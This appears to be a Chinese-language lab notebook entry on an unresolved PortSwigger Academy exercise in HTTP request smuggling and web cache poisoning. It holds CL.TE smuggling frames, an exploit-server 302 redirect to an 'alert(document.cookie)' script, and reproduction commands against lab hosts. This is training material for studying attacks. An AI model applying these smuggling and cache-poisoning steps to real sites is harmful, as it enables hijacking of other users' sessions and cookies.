---
title: "lab-perform-web-cache-poisoning"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-perform-web-cache-poisoning

> evidences: [[request-smuggling-family]]

- 题面:Exploiting HTTP request smuggling to perform web cache poisoning;前端不支持 chunked、前端缓存某些响应;
  目标 = 投毒缓存,使后续对 JS 文件的请求**302 到 exploit server**,毒缓存 `alert(document.cookie)`。
- 实例(批40):https://0a0b00db044848fa800f94cd00130080.web-security-academy.net
  exploit server:`https://exploit-0a6600e204934808801a9352010f0055.exploit-server.net`
- 状态:**unresolved**(302 的"出处"与"写入缓存"两头都已查清,缺把二者接起来的那一步)。

## 已确认的面

1. 靶场 app = 精简博客:`/`、`/post?postId=N`、`POST /post/comment`、`/resources/js/tracking.js`(体 70B,
   `document.write('<img src="/resources/images/tracker.gif?page=post">')`,带 `Cache-Control: max-age=30`)、`/image/*`;
   **无** `/login`/`/my-account`(404 JSON `"Not Found"`)。
2. **缓存判定 = Cache-Control:max-age**(见 lab-perform-web-cache-deception 记录):带 max-age 的 404 也缓存;
   不带的一律不缓存(exploit server 的响应就没有 ⇒ 不会被存)。
3. exploit server 可被当作 302 出处:`responseFile=/resources/js/tracking.js` +
   Head `HTTP/1.1 302 Found\nLocation: https://<exploit>/js/evil.js`,另存 `/js/evil.js` = `alert(document.cookie)`
   (`Content-Type: application/javascript`)⇒ **经前端用 `Host: <exploit>` 请求时真的拿到 302** ✓。
   - **Head 字段只接受两行**(状态行 + 一个头):再加一行 `Cache-Control: max-age=300` 会把该文件清掉(之后 404)⇒
     无法让这个 302 自带 max-age ⇒ 前端不会缓存它。
   - 缓存键含 Host:靶场 Host 请求同一 JS URL 仍是 app 的 JS(`X-Cache: miss`)。
4. **走私请求到不了 exploit server**:它在靶场后端的连接里;exploit server 访问日志无走私请求 ✓。
5. app 自身的 302 都是相对路径(`/post?postId=1` 等)⇒ 没有指向外部的绝对 Location;
   `X-Forwarded-Host` 只被**反射**(canonical/绝对 URL),不触发路由;`X-Forwarded-Scheme: http` / `X-Forwarded-Proto: http` → 421 `Invalid host`。
6. CL.TE 帧已按 `conn_reuse --cl-te` 语义构造(POST + CL=len("0\r\n\r\n"+prefix) + TE:chunked),外层为 `POST /` 时 app 回
   `Connection: close`(未消费 body),改用 `POST /post/comment` 作外层被 **reset by peer**(疑限流)。

## 未决面

- 需要一个 **lab app 产的、Location 指向我方 host 的 302**(未找到),或让"走私响应"被前端记到靶场 Host 的 JS 键上
  (即前端连接池复用/同连接错位——本 lab 前端不回这种机会)。

## 复现

```
lab_launch launch 25D1DC76D4C49C69B12C03E8E115EA2C4ECCE7048480403AFD87AE4FA5196C6A --widget-source /web-security/request-smuggling/exploiting --jar <jar>
lab_http post <exploit>/ --form responseFile=/resources/js/tracking.js --form 'responseHead=HTTP/1.1 302 Found\nLocation: https://<exploit>/js/evil.js' --form responseBody=redir --form formAction=STORE
conn_reuse <lab>/ --path / --cl-te 'GET /resources/js/tracking.js HTTP/1.1\r\nHost: <exploit>\r\n\r\n' --read-ms 3000
```
